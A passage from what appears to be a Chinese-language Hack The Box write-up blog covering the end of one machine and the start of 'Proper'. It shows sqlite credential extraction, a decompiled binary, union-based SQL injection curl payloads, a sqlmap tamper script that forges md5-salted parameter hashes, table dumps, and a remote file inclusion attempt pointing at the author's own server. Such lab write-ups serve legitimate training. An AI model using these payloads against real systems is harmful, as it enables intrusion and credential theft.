plum.sqlite-wal</span><br></pre></td></tr></table></figure><p>复制到本地使用sqlite访问</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlite3 plum.sqlite </span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">Media           Stroke          SyncState       User          </span><br><span class="line">Note            StrokeMetadata  UpgradedNote  </span><br><span class="line">sqlite&gt; select * from Note;</span><br><span class="line">\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!</span><br><span class="line">\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g</span><br><span class="line">\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]|ManagedPosition=|1|0||Yellow|0|||||||0c32c3d8-7c60-48ae-939e-798df198cfe7|8e814e57-9d28-4288-961c-31c806338c5b|637423162765765332||637423163995607122</span><br></pre></td></tr></table></figure><p>得到凭证<code>development:fN3)sN5Ee@g</code><br />登入ssh服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Development</span><br><span class="line"></span><br><span class="line">11/29/2020  04:11 AM            18,312 Krypter_Linux</span><br></pre></td></tr></table></figure><p>IDA反编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">44</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+3Ch] [rbp-24h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+4Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(v6, argv, envp);</span><br><span class="line">  v8 = curl_easy_init();</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Krypter V1.2\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;New project by Juliette.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;New features added weekly!\n&quot;</span></span><br><span class="line">    <span class="string">&quot;What to expect next update:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\t- Windows version with GUI support\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\t- Get password from cloud and AUTOMATICALLY decrypt!\n&quot;</span></span><br><span class="line">    <span class="string">&quot;***\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( argc == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = i;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt;= <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v10 += argv[<span class="number">1</span>][i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v10 == <span class="number">1601</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Requesting decryption key from cloud...\nAccount: Administrator&quot;</span>);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">10002LL</span>, (__int64)<span class="string">&quot;http://passmanager.htb:1234/index.php&quot;</span>);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">10015LL</span>, (__int64)<span class="string">&quot;method=select&amp;username=administrator&amp;table=passwords&quot;</span>);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">20011LL</span>, (__int64)WriteCallback);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">10001LL</span>, (__int64)v6);</span><br><span class="line">        v7 = curl_easy_perform(v8);</span><br><span class="line">        curl_easy_cleanup(v8);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Server response:\n\n&quot;</span>);</span><br><span class="line">        v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, v6);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Incorrect master key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No key supplied.\nUSAGE:\n\nKrypter &lt;key&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ant</span><br><span class="line"></span><br><span class="line">  TCP    127.0.0.1:1234         0.0.0.0:0              LISTENING       InHost</span><br></pre></td></tr></table></figure><p>用程序中的URL访问</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&quot;</span></span><br><span class="line"></span><br><span class="line">selectarray(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [<span class="string">&quot;aes_key&quot;</span>]=&gt;</span><br><span class="line">    string(16) <span class="string">&quot;k19D193j.&lt;19391(&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到AES_KEY</p><p>尝试SQL注入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+or+1%23&amp;table=passwords&quot;</span></span><br><span class="line">selectarray(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [<span class="string">&quot;aes_key&quot;</span>]=&gt;</span><br><span class="line">    string(16) <span class="string">&quot;k19D193j.&lt;19391(&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>手工注入</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+or+1%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+1%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+database()%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(table_name)+from+information_schema.tables+where+table_schema=&#x27;bread&#x27;%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(column_name)+from+information_schema.columns+where+table_name=&#x27;passwords&#x27;%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(password)+from+bread.passwords%23&amp;table=passwords&quot;</span></span><br></pre></td></tr></table></figure><p>得到<code>H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=</code></p><ul><li>SSH端口映射跑SQLMap</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -L 1234:127.0.0.1:1234 development@10.10.10.228</span><br><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&quot;</span></span><br></pre></td></tr></table></figure><p>sqlmap的步骤就懒得写了</p><p>解密</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">iv = <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">cipher = base64.b64decode(<span class="string">&quot;H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=&quot;</span>)</span><br><span class="line">_aes = AES.new(<span class="string">b&quot;k19D193j.&lt;19391(&quot;</span>, AES.MODE_CBC, iv)</span><br><span class="line">plain = _aes.decrypt(cipher)</span><br><span class="line">print(plain)</span><br></pre></td></tr></table></figure><p>得到凭证<code>administrator:p@ssw0rd!@#$9890./</code><br />登入SSH服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\Users\Administrator\Desktop\root.txt</span><br><span class="line">c04f72045d76a74c63a602f199a79ecd</span><br></pre></td></tr></table></figure><p>挺综合的一台机器</p><hr /><h1 id="proper"><a class="markdownIt-Anchor" href="#proper"></a> Proper</h1><h2 id="端口扫描-4"><a class="markdownIt-Anchor" href="#端口扫描-4"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.231</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.231</span><br><span class="line">Host is up (0.081s latency).</span><br><span class="line">Not shown: 999 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 10.0</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="路径扫描-2"><a class="markdownIt-Anchor" href="#路径扫描-2"></a> 路径扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://10.10.10.231/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.231/assets/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.231/licenses/</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-4"><a class="markdownIt-Anchor" href="#漏洞利用-4"></a> 漏洞利用</h2><p>浏览主页源码看到</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line">jQuery(<span class="string">&#x27;#headerwrap&#x27;</span>).backstretch([ <span class="string">&quot;assets/img/bg/bg1.jpg&quot;</span>, <span class="string">&quot;assets/img/bg/bg3.jpg&quot;</span> ], &#123;<span class="attr">duration</span>: <span class="number">8000</span>, <span class="attr">fade</span>: <span class="number">500</span>&#125;);</span><br><span class="line">$( <span class="string">&quot;#product-content&quot;</span> ).load(<span class="string">&quot;/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.231/products-ajax.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// [8] Undefined index: order On line 6 in file C:\inetpub\wwwroot\products-ajax.php</span></span><br><span class="line">define(<span class="string">&#x27;SECURE_PARAM_SALT&#x27;</span>,<span class="string">&#x27;hie0shah6ooNoim&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;functions.php&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;db-config.php&#x27;</span>); </span><br><span class="line"><span class="keyword">if</span> ( !<span class="variable">$_GET</span>[<span class="string">&#x27;order&#x27;</span>] || !<span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>] ) &#123;</span><br><span class="line"><span class="comment">// Set the response code to 500 </span></span><br><span class="line">http_response_code(<span class="number">500</span>); </span><br><span class="line"><span class="comment">// and die(). Someone fiddled with the parameters. </span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Parameter missing or malformed.&#x27;</span>); </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试得到以下算法<br /><code>Hash = md5(Salt+Payload)</code></p><p>SQLMap tamper</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">salt = <span class="string">b&quot;hie0shah6ooNoim&quot;</span></span><br><span class="line">h = hashlib.md5(salt + payload.encode()).hexdigest()</span><br><span class="line">retVal = <span class="string">&quot;&#123;&#125;&amp;h=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload, h)</span><br><span class="line"><span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py --dbs --batch --skip-urlencode</span><br><span class="line">available databases [3]:</span><br><span class="line">[*] cleaner</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner --tables --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">[3 tables]</span><br><span class="line">+-----------+</span><br><span class="line">| customers |</span><br><span class="line">| licenses  |</span><br><span class="line">| products  |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T licenses --columns --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: licenses</span><br><span class="line">[4 columns]</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| Column      | Type        |</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| customer_id | int(11)     |</span><br><span class="line">| id          | int(11)     |</span><br><span class="line">| license     | varchar(50) |</span><br><span class="line">| product_id  | int(11)     |</span><br><span class="line">+-------------+-------------+</span><br><span class="line"></span><br><span class="line">proxychains sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T licenses -D customer_id,id,license,product_id --dump --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: licenses</span><br><span class="line">[18 entries]</span><br><span class="line">+-------------+----+--------------------------------------+------------+</span><br><span class="line">| customer_id | id | license                              | product_id |</span><br><span class="line">+-------------+----+--------------------------------------+------------+</span><br><span class="line">| 4           | 1  | 7d4cdf91-119b-414d-b16b-7cb841b2c182 | 4          |</span><br><span class="line">| 17          | 2  | e7b59b20-8c70-48b0-91da-58bf354b18d5 | 8          |</span><br><span class="line">| 17          | 3  | 3ea26f9c-f7c8-428f-a613-f4c66f08d0b9 | 6          |</span><br><span class="line">| 17          | 4  | 372b02bd-8730-4bc6-a6fb-8cf9726f797b | 4          |</span><br><span class="line">| 15          | 5  | 75ab3363-43d4-4e6b-903a-9d36919b36be | 8          |</span><br><span class="line">| 16          | 6  | 139aff78-770c-4c59-9aef-32c4c65e68b3 | 4          |</span><br><span class="line">| 22          | 7  | bdf82583-9f1a-42a3-b892-4b569e77f4c9 | 2          |</span><br><span class="line">| 11          | 8  | d7da6b56-6f8c-4a26-85cc-c80860f3021a | 8          |</span><br><span class="line">| 21          | 9  | 2ca03799-bd0d-4baa-a163-eb2a3b143f22 | 4          |</span><br><span class="line">| 7           | 10 | 0a65e4e4-f1c7-4452-9bf0-02f4d6c35410 | 4          |</span><br><span class="line">| 7           | 11 | 2e14ce43-8e85-43d7-b9ae-ab2c2ff64bf8 | 4          |</span><br><span class="line">| 15          | 12 | 873f8add-2f3c-4da2-9164-649f55c1d329 | 4          |</span><br><span class="line">| 2           | 13 | c63524b6-6346-4a34-b5c3-a3fe46593df1 | 4          |</span><br><span class="line">| 25          | 14 | ad228131-518a-4527-8a1c-46d0723b691d | 2          |</span><br><span class="line">| 1           | 15 | 4fa6a5cd-2081-4222-9b46-6c58df72bcfd | 8          |</span><br><span class="line">| 1           | 16 | 183a7e47-e3cf-46f9-80fa-acb63590cc1c | 2          |</span><br><span class="line">| 9           | 17 | 49dea5ef-3f7f-4790-9b94-b6bf29f5f893 | 2          |</span><br><span class="line">| 4           | 18 | 41e5be3a-20fc-47b2-9dcc-c05def688cdb | 6          |</span><br><span class="line">+-------------+----+--------------------------------------+------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T customers --columns --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: customers</span><br><span class="line">[4 columns]</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| Column        | Type         |</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| customer_name | varchar(50)  |</span><br><span class="line">| id            | int(11)      |</span><br><span class="line">| login         | varchar(255) |</span><br><span class="line">| password      | varchar(255) |</span><br><span class="line">+---------------+--------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T customers -C customer_name,id,login,password --dump --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: customers</span><br><span class="line">[11 entries]</span><br><span class="line">+---------------------+----+------------------------------+----------------------------------+</span><br><span class="line">| customer_name       | id | login                        | password                         |</span><br><span class="line">+---------------------+----+------------------------------+----------------------------------+</span><br><span class="line">| Vikki Solomon       | 1  | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c |</span><br><span class="line">| Neave Stone         | 2  | nstone@trashbin.mail         | 6cb75f652a9b52798eb6cf2201057c73 |</span><br><span class="line">| Bertie McEachern    | 3  | bmceachern7@discovery.moc    | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| Jordana Kleiser     | 4  | jkleiser8@google.com.xy      | 827ccb0eea8a706c4c34a16891f84e7b |</span><br><span class="line">| Mariellen Chasemore | 5  | mchasemore9@sitemeter.moc    | 25f9e794323b453885f5181f1b624d0b |</span><br><span class="line">| Gwyneth Dornin      | 6  | gdornina@marriott.moc        | 5f4dcc3b5aa765d61d8327deb882cf99 |</span><br><span class="line">| Israel Tootell      | 7  | itootellb@forbes.moc         | f25a2fc72690b780b2a14e140ef6a9e0 |</span><br><span class="line">| Karon Mangham       | 8  | kmanghamc@state.tx.su        | 8afa847f50a716e64932d995c8e7435a |</span><br><span class="line">| Janifer Blinde      | 9  | jblinded@bing.moc            | fcea920f7412b5da7be0cf42b8c93759 |</span><br><span class="line">| Laurens Lenchenko   | 10 | llenchenkoe@macromedia.moc   | f806fc5a2a0d5ba2471600758452799c |</span><br><span class="line">| Andreana Austin     | 11 | aaustinf@booking.moc         | 25d55ad283aa400af464c76d713c07ad |</span><br><span class="line">+---------------------+----+------------------------------+----------------------------------+</span><br></pre></td></tr></table></figure><p>MD5基本都是弱口令随便<br />随意用一个凭证登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.231/licenses/licenses.php?theme=&amp;h=9094e65be4a9dc27cd4af70674a99c64</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// [2] include(/header.inc): failed to open stream: No such file or directory On line 36 in file C:\inetpub\wwwroot\functions.php</span></span><br><span class="line"><span class="comment">// Following function securely includes a file. Whenever we </span></span><br><span class="line"><span class="comment">// will encounter a PHP tag we will just bail out here. </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">secure_include</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line"><span class="keyword">if</span> (strpos(file_get_contents(<span class="variable">$file</span>),<span class="string">&#x27;&lt;?&#x27;</span>) === <span class="literal">false</span>) &#123; </span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);                <span class="comment">//&lt;&lt;&lt;&lt;&lt; Error encountered in this line.</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">http_response_code(<span class="number">403</span>); </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Forbidden - Tampering attempt detected.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试RFI</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9998</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.231/licenses/licenses.php?theme=http://10.10.16.7:9998/&amp;h=c68113684a9e7ddca835d8f0235e2759</span><br><span class="line"></span><br><span class="line">[2] include(): http:// wrapper is disabled <span class="keyword">in</span> the server configuration by allow_url_include=0</span><br><span class="line">On line 36 <span class="keyword">in</span> file 